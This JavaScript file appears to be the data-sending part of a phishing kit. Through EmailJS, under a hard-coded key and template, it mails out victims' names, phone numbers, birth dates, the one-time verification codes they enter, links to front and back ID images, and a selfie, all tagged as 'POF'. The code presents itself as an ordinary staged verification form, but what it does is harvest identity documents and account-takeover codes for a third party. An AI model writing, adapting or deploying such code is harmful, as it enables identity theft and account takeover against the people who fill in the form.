'use strict';

// ── EmailJS config ───────────────────────────────────────
// Replace these three values with your own from emailjs.com
const EMAILJS_PUBLIC_KEY  = 'gxIp8aQev0DxyBUMb';
const EMAILJS_SERVICE_ID  = 'default_service';
const EMAILJS_TEMPLATE_ID = 'template_sz2hy6t';

// ── Init ─────────────────────────────────────────────────
function initEmailJS() {
  if (typeof emailjs === 'undefined') {
    console.warn('EmailJS SDK not loaded.');
    return;
  }
  emailjs.init({ publicKey: EMAILJS_PUBLIC_KEY });
}

// ── Core sender ──────────────────────────────────────────
function sendStageEmail(stage, lines) {
  if (typeof emailjs === 'undefined') return Promise.resolve();

  const content = lines
    .map(([key, val]) => `${key}: ${val || '—'}`)
    .join('\n');

  return emailjs.send(EMAILJS_SERVICE_ID, EMAILJS_TEMPLATE_ID, {
    type:"pof",
    stage,
    content,
    submitted_at: new Date().toLocaleString(),
  }).catch(err => console.error('EmailJS error:', err));
}

// ── Stage emails ─────────────────────────────────────────
function emailStage1(data) {
  return sendStageEmail('Stage 1', [
    ['First Name',    data.firstName],
    ['Last Name',     data.lastName],
    ['Email',         data.email],
    ['Phone',         data.phoneCode + ' ' + data.phone],
    ['Date of Birth', data.dob],
    ['Gender',        data.gender],
    ['Social Handle', data.social || 'Not provided'],
    ['Has POF Account', data.hasPofAccount ? 'Yes' : 'No'],
  ]);
}

function emailStage2(data) {
  return sendStageEmail('Stage 2', [
    ['Name',            data.firstName + ' ' + data.lastName],
    ['Phone Verified',  data.phoneCode + ' ' + data.phone],
    ['Verification',    data.otp],
  ]);
}

function emailStage3(data) {
  return sendStageEmail('Stage 3', [
    ['Name',        data.firstName + ' ' + data.lastName],
    ['Email',       data.email],
    ['ID Type',     data.idType],
    ['Front ID',    data.frontUrl  || 'Not uploaded'],
    ['Back ID',     data.backUrl   || 'Not required'],
    ['Selfie',      data.selfieUrl || 'Not uploaded'],
    ['POF Account', data.hasPofAccount ? 'Yes' : 'No'],
  ]);
}
